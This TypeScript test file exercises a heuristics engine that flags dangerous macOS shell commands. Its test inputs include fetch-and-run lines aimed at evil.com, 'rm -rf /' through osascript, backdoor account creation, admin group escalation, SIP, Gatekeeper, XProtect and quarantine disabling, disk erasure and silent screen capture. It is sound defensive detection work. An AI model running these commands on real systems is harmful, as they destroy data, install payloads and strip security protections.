import { beforeAll, describe, expect, it } from "vitest";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const matchCommand = createMatcher("command");

describe("macOS command threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	// --- osascript RCE (CLT-MAC-CMD-001..004) ---

	it("detects osascript -e 'do shell script' (001)", () => {
		expect(matchCommand(engine, "osascript -e 'do shell script \"rm -rf /\"'")).toContain(
			"CLT-MAC-CMD-001",
		);
	});

	it("detects osascript -l JavaScript (002)", () => {
		expect(matchCommand(engine, "osascript -l JavaScript -e 'ObjC.import(\"stdlib\")'")).toContain(
			"CLT-MAC-CMD-002",
		);
	});

	it("detects piped input to osascript (003)", () => {
		expect(matchCommand(engine, "echo 'do shell script \"id\"' | osascript")).toContain(
			"CLT-MAC-CMD-003",
		);
	});

	it("does not match a longer identifier containing osascript (003 FP)", () => {
		const ids = matchCommand(engine, "cat notes.txt | osascriptable-formatter");
		expect(ids).not.toContain("CLT-MAC-CMD-003");
	});

	it("still matches a quoted mention containing a literal pipe (003 known gap)", () => {
		// Known, accepted gap: the pipe boundary is a literal character, so a
		// prose sentence that happens to contain "| osascript" still fires --
		// same deliberate-gap class as `echo "(shred -u f)"` in
		// docs/developer-guide.md's "What it does not match" table.
		const ids = matchCommand(engine, 'echo "malware pipes payload | osascript to execute"');
		expect(ids).toContain("CLT-MAC-CMD-003");
	});

	it("detects curl piped to osascript (004)", () => {
		expect(matchCommand(engine, "curl https://evil.com/payload.scpt | osascript")).toContain(
			"CLT-MAC-CMD-004",
		);
	});

	it("does not match osascript as a substring of a longer identifier (004 FP)", () => {
		const ids = matchCommand(engine, "curl https://evil.com/payload.txt | grep osascriptable-tool");
		expect(ids.filter((id) => id === "CLT-MAC-CMD-004")).toEqual([]);
	});

	it("does not match curl as a substring of a longer identifier (004 FP)", () => {
		const ids = matchCommand(engine, "osascript payload.scpt && start_curling_service");
		expect(ids.filter((id) => id === "CLT-MAC-CMD-004")).toEqual([]);
	});

	// --- open command abuse (CLT-MAC-CMD-005..006) ---

	it("detects open -a Terminal (005)", () => {
		expect(matchCommand(engine, "open -a Terminal evil.sh")).toContain("CLT-MAC-CMD-005");
	});

	it("detects open -j (hidden) (006)", () => {
		expect(matchCommand(engine, "open -j /Applications/Malware.app")).toContain("CLT-MAC-CMD-006");
	});

	it("detects open --background (006)", () => {
		expect(matchCommand(engine, "open --background /tmp/agent.app")).toContain("CLT-MAC-CMD-006");
	});

	// --- macOS LOLBins (CLT-MAC-CMD-007..013) ---

	it("detects dscl -create (007)", () => {
		expect(matchCommand(engine, "dscl . -create /Users/backdoor")).toContain("CLT-MAC-CMD-007");
	});

	it("detects networksetup -setwebproxy (008)", () => {
		expect(matchCommand(engine, "networksetup -setwebproxy Wi-Fi 10.0.0.1 8080")).toContain(
			"CLT-MAC-CMD-008",
		);
	});

	it("detects networksetup -setdnsservers (008)", () => {
		expect(matchCommand(engine, "networksetup -setdnsservers Wi-Fi 10.0.0.1")).toContain(
			"CLT-MAC-CMD-008",
		);
	});

	it("detects systemsetup -setremotelogin on (009)", () => {
		expect(matchCommand(engine, "systemsetup -setremotelogin on")).toContain("CLT-MAC-CMD-009");
	});

	it("detects kickstart ARD activation (010)", () => {
		expect(
			matchCommand(
				engine,
				"/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on",
			),
		).toContain("CLT-MAC-CMD-010");
	});

	it("detects installer -pkg -target (011)", () => {
		expect(matchCommand(engine, "installer -pkg evil.pkg -target /")).toContain("CLT-MAC-CMD-011");
	});

	it("detects hdiutil attach remote DMG (012)", () => {
		expect(matchCommand(engine, "hdiutil attach https://evil.com/payload.dmg")).toContain(
			"CLT-MAC-CMD-012",
		);
	});

	it("detects pkgutil --forget (013)", () => {
		expect(matchCommand(engine, "pkgutil --forget com.evil.pkg")).toContain("CLT-MAC-CMD-013");
	});

	// --- Destructive Operations (CLT-MAC-CMD-014..015) ---

	it("detects diskutil eraseDisk (014)", () => {
		expect(matchCommand(engine, "diskutil eraseDisk JHFS+ Clean disk0")).toContain(
			"CLT-MAC-CMD-014",
		);
	});

	it("detects diskutil secureErase (014)", () => {
		expect(matchCommand(engine, "diskutil secureErase 3 disk1")).toContain("CLT-MAC-CMD-014");
	});

	it("detects tmutil delete (015)", () => {
		expect(
			matchCommand(engine, "tmutil delete /Volumes/Backup/Backups.backupdb/Mac/2024-01-01"),
		).toContain("CLT-MAC-CMD-015");
	});

	it("detects tmutil disable (015)", () => {
		expect(matchCommand(engine, "tmutil disable")).toContain("CLT-MAC-CMD-015");
	});

	// --- Defense Evasion (CLT-MAC-CMD-016..023) ---

	it("detects spctl --master-disable (016)", () => {
		expect(matchCommand(engine, "spctl --master-disable")).toContain("CLT-MAC-CMD-016");
	});

	it("detects csrutil disable (017)", () => {
		expect(matchCommand(engine, "csrutil disable")).toContain("CLT-MAC-CMD-017");
	});

	it("detects defaults write LSQuarantine (018)", () => {
		expect(
			matchCommand(engine, "defaults write com.apple.LaunchServices LSQuarantine -bool NO"),
		).toContain("CLT-MAC-CMD-018");
	});

	it("detects xattr -d com.apple.quarantine (019)", () => {
		expect(matchCommand(engine, "xattr -d com.apple.quarantine /tmp/evil.app")).toContain(
			"CLT-MAC-CMD-019",
		);
	});

	it("detects pfctl -d (020)", () => {
		expect(matchCommand(engine, "pfctl -d")).toContain("CLT-MAC-CMD-020");
	});

	it("detects tccutil reset (021)", () => {
		expect(matchCommand(engine, "tccutil reset All")).toContain("CLT-MAC-CMD-021");
	});

	it("detects launchctl unload security daemon (022)", () => {
		expect(
			matchCommand(engine, "launchctl unload -w /System/Library/LaunchDaemons/com.apple.MRT.plist"),
		).toContain("CLT-MAC-CMD-022");
	});

	it("detects launchctl bootout XProtect (022)", () => {
		expect(matchCommand(engine, "launchctl bootout system/com.apple.XProtect")).toContain(
			"CLT-MAC-CMD-022",
		);
	});

	it("detects defaults write security-related (023)", () => {
		expect(
			matchCommand(engine, "defaults write com.apple.loginwindow DisableScreenLock -bool true"),
		).toContain("CLT-MAC-CMD-023");
	});

	// --- Privilege Escalation (CLT-MAC-CMD-024..026) ---

	it("detects dscl -passwd (024)", () => {
		expect(matchCommand(engine, "dscl . -passwd /Users/admin newpassword")).toContain(
			"CLT-MAC-CMD-024",
		);
	});

	it("detects dseditgroup add to admin (025)", () => {
		expect(matchCommand(engine, "dseditgroup -o edit -a eviluser -t user admin")).toContain(
			"CLT-MAC-CMD-025",
		);
	});

	it("detects createhomedir (026)", () => {
		expect(matchCommand(engine, "createhomedir -c -u backdoor")).toContain("CLT-MAC-CMD-026");
	});

	it("does not match a compound identifier containing createhomedir (026 FP)", () => {
		const ids = matchCommand(engine, "grep -n createhomedir-helper.sh install.log");
		expect(ids).not.toContain("CLT-MAC-CMD-026");
	});

	it("does not match a quoted mention of createhomedir (026 FP)", () => {
		const ids = matchCommand(engine, 'echo "run createhomedir -c -u newuser after account setup"');
		expect(ids).not.toContain("CLT-MAC-CMD-026");
	});

	it("does not match a bare createhomedir mention (026 FP)", () => {
		const ids = matchCommand(engine, "man createhomedir | head");
		expect(ids).not.toContain("CLT-MAC-CMD-026");
	});

	// Reverse shells (Python, Ruby, zsh) moved to command-threats.test.ts (CLT-CMD-023..025)

	// --- Screen Capture (CLT-MAC-CMD-027) ---

	it("detects silent screencapture -x (027)", () => {
		expect(matchCommand(engine, "screencapture -x /tmp/screen.png")).toContain("CLT-MAC-CMD-027");
	});

	// --- Negative cases ---

	it("does not match osascript -e with harmless dialog", () => {
		const ids = matchCommand(engine, "osascript -e 'display dialog \"Hello\"'");
		expect(ids.filter((id) => id === "CLT-MAC-CMD-001")).toEqual([]);
	});

	it("does not match open without flags", () => {
		const ids = matchCommand(engine, "open /Applications/Safari.app");
		expect(
			ids.filter((id) => id.startsWith("CLT-MAC-CMD-005") || id.startsWith("CLT-MAC-CMD-006")),
		).toEqual([]);
	});

	it("does not match diskutil list (harmless)", () => {
		const ids = matchCommand(engine, "diskutil list");
		expect(ids.filter((id) => id === "CLT-MAC-CMD-014")).toEqual([]);
	});

	it("does not match tmutil status (harmless)", () => {
		const ids = matchCommand(engine, "tmutil status");
		expect(ids.filter((id) => id === "CLT-MAC-CMD-015")).toEqual([]);
	});

	it("does not match spctl --assess (harmless check)", () => {
		const ids = matchCommand(engine, "spctl --assess /Applications/App.app");
		expect(ids.filter((id) => id === "CLT-MAC-CMD-016")).toEqual([]);
	});

	it("does not match csrutil status (harmless)", () => {
		const ids = matchCommand(engine, "csrutil status");
		expect(ids.filter((id) => id === "CLT-MAC-CMD-017")).toEqual([]);
	});

	it("does not match screencapture without -x/-C", () => {
		const ids = matchCommand(engine, "screencapture ~/Desktop/screenshot.png");
		expect(ids.filter((id) => id === "CLT-MAC-CMD-027")).toEqual([]);
	});

	// --- Quoted-mention FP coverage for the CMD_POS corpus sweep ---

	it("does not match a prose mention of osascript do shell script (001 FP)", () => {
		const ids = matchCommand(engine, 'echo "osascript -e do shell script is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-001");
	});

	it("does not match a prose mention of osascript JXA (002 FP)", () => {
		const ids = matchCommand(engine, 'echo "osascript -l JavaScript is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-002");
	});

	it("does not match a prose mention of curl piped to osascript (004 FP)", () => {
		const ids = matchCommand(engine, 'echo "curl payload.scpt | osascript is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-004");
	});

	it("does not match a prose mention of open -a Terminal (005 FP)", () => {
		const ids = matchCommand(engine, 'echo "open -a Terminal is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-005");
	});

	it("does not match a prose mention of open --background (006 FP)", () => {
		const ids = matchCommand(engine, 'echo "open --background is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-006");
	});

	it("does not match a prose mention of dscl -create (007 FP)", () => {
		const ids = matchCommand(engine, 'echo "dscl -create is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-007");
	});

	it("does not match a prose mention of networksetup -setwebproxy (008 FP)", () => {
		const ids = matchCommand(engine, 'echo "networksetup -setwebproxy is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-008");
	});

	it("does not match a prose mention of systemsetup -setremotelogin (009 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "systemsetup -setremotelogin on is a classic technique"',
		);
		expect(ids).not.toContain("CLT-MAC-CMD-009");
	});

	it("does not match a prose mention of kickstart activation (010 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "kickstart -activate -configure is a classic technique"',
		);
		expect(ids).not.toContain("CLT-MAC-CMD-010");
	});

	it("does not match a prose mention of installer -pkg -target (011 FP)", () => {
		const ids = matchCommand(engine, 'echo "installer -pkg -target is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-011");
	});

	it("does not match a prose mention of hdiutil attach (012 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "hdiutil attach https://evil.com is a classic technique"',
		);
		expect(ids).not.toContain("CLT-MAC-CMD-012");
	});

	it("does not match a prose mention of pkgutil --forget (013 FP)", () => {
		const ids = matchCommand(engine, 'echo "pkgutil --forget is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-013");
	});

	it("does not match a prose mention of diskutil eraseDisk (014 FP)", () => {
		const ids = matchCommand(engine, 'echo "diskutil eraseDisk is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-014");
	});

	it("does not match a prose mention of tmutil disable (015 FP)", () => {
		const ids = matchCommand(engine, 'echo "tmutil disable is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-015");
	});

	it("does not match a prose mention of spctl --master-disable (016 FP)", () => {
		const ids = matchCommand(engine, 'echo "spctl --master-disable is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-016");
	});

	it("does not match a prose mention of csrutil disable (017 FP)", () => {
		const ids = matchCommand(engine, 'echo "csrutil disable is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-017");
	});

	it("does not match a prose mention of defaults write LSQuarantine (018 FP)", () => {
		const ids = matchCommand(engine, 'echo "defaults write LSQuarantine is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-018");
	});

	it("does not match a prose mention of xattr -d com.apple.quarantine (019 FP)", () => {
		const ids = matchCommand(engine, 'echo "xattr -d com.apple.quarantine is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-019");
	});

	it("does not match a prose mention of pfctl -d (020 FP)", () => {
		const ids = matchCommand(engine, 'echo "pfctl -d is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-020");
	});

	it("does not match a prose mention of tccutil reset (021 FP)", () => {
		const ids = matchCommand(engine, 'echo "tccutil reset is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-021");
	});

	it("does not match a prose mention of launchctl unload com.apple.MRT (022 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "launchctl unload com.apple.MRT is a classic technique"',
		);
		expect(ids).not.toContain("CLT-MAC-CMD-022");
	});

	it("does not match a prose mention of defaults write com.apple.loginwindow (023 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "defaults write com.apple.loginwindow is a classic technique"',
		);
		expect(ids).not.toContain("CLT-MAC-CMD-023");
	});

	it("does not match a prose mention of dscl -passwd (024 FP)", () => {
		const ids = matchCommand(engine, 'echo "dscl -passwd is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-024");
	});

	it("does not match a prose mention of dseditgroup -o edit -a admin (025 FP)", () => {
		const ids = matchCommand(engine, 'echo "dseditgroup -o edit -a admin is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-025");
	});

	it("does not match a prose mention of screencapture -x (027 FP)", () => {
		const ids = matchCommand(engine, 'echo "screencapture -x is a classic technique"');
		expect(ids).not.toContain("CLT-MAC-CMD-027");
	});
});
